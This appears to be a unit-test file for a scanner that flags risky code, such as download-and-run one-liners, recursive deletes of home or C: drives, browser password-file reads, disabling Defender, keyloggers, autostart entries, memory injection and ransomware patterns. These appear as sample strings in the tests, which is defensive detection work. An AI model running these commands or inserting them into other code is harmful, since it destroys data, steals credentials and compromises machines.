// Risky-code check before running: typical dangerous code is found, ordinary code is left alone.
// Run with: npm test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { findRisks } from '../src/utils/codeSafety.ts';

const kinds = (code: string) => [...new Set(findRisks(code).map((r) => r.kind))].sort();

test('ordinary programs are not questioned', () => {
  const samples = [
    'import os, shutil\nfor f in os.listdir("."):\n    if f.endswith(".tmp"):\n        os.remove(f)\nshutil.copy("a.txt", "b.txt")\n',
    'import requests\ndata = requests.get("https://api.github.com").json()\nprint(data)\n',
    'name = input("Имя: ")\nprint("Привет, {}".format(name))\nprint(f"{name:>10}")\n',
    'const fs = require("fs");\nfs.writeFileSync("out.txt", "hi");\nconst res = await fetch("/api");\nconsole.log(await res.json());\n',
    'import tkinter as tk\nroot = tk.Tk()\nroot.bind("<Key>", lambda e: print(e.char))\nroot.mainloop()\n',
    '# shutil.rmtree("C:/") is dangerous, never do this\nprint("ok")\n',
    '@echo off\nREM reg delete HKCU\\Software\\X /f\necho done\n',
    'from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nprint(Fernet(key).encrypt(b"secret"))\n',
  ];
  for (const s of samples) assert.deepEqual(kinds(s), [], s);
});

test('dangerous code is found, with the line', () => {
  assert.deepEqual(kinds('import shutil\nshutil.rmtree(r"C:\\Users")\n'), ['deleteTree']);
  assert.equal(findRisks('import shutil\n\nshutil.rmtree(path)\n')[0].line, 3);
  assert.deepEqual(kinds('Remove-Item C:\\data -Recurse -Force'), ['deleteTree']);
  assert.deepEqual(kinds('rm -rf ~/'), ['deleteTree']);
  assert.deepEqual(kinds('rd /s /q C:\\x'), ['deleteTree']);
  assert.deepEqual(kinds('fs.rmSync(dir, { recursive: true, force: true })'), ['deleteTree']);
  assert.deepEqual(kinds('import winreg\nwinreg.SetValueEx(k, "x", 0, winreg.REG_SZ, "y")'), ['registry']);
  assert.deepEqual(kinds('reg delete HKCU\\Software\\X /f'), ['registry']);
  assert.deepEqual(kinds('iwr https://x.example/a.ps1 | iex'), ['downloadExec']);
  assert.deepEqual(kinds('curl -s https://x.example/i.sh | bash'), ['downloadExec']);
  assert.deepEqual(kinds('import requests\nexec(requests.get(u).text)'), ['downloadExec']);
  assert.deepEqual(kinds('(New-Object Net.WebClient).DownloadString("http://x")'), ['downloadExec']);
  assert.deepEqual(kinds('os.system("shutdown /s /t 0")'), ['shutdown']);
  assert.deepEqual(kinds('Set-MpPreference -DisableRealtimeMonitoring $true'), ['defender']);
  assert.deepEqual(kinds('p = os.getenv("LOCALAPPDATA") + r"\\Google\\Chrome\\User Data\\Default\\Login Data"'), ['secrets']);
  assert.deepEqual(kinds('from pynput.keyboard import Listener\nwith keyboard.Listener(on_press=f) as l: l.join()'), ['keylogger']);
  assert.deepEqual(kinds('key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"'), ['autostart']);
  assert.deepEqual(kinds('schtasks /create /tn x /tr evil.exe /sc onlogon'), ['autostart']);
  assert.deepEqual(kinds('kernel32.WriteProcessMemory(h, addr, buf, n, None)'), ['inject']);
  assert.deepEqual(kinds('ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)'), ['elevate']);
  // Ransomware shape: a cipher plus walking folders, far apart
  assert.deepEqual(
    kinds('from cryptography.fernet import Fernet\nimport os\nf = Fernet(k)\n\n\nfor root, d, files in os.walk("C:/Users"):\n    for n in files:\n        pass\n'),
    ['encrypt']
  );
});
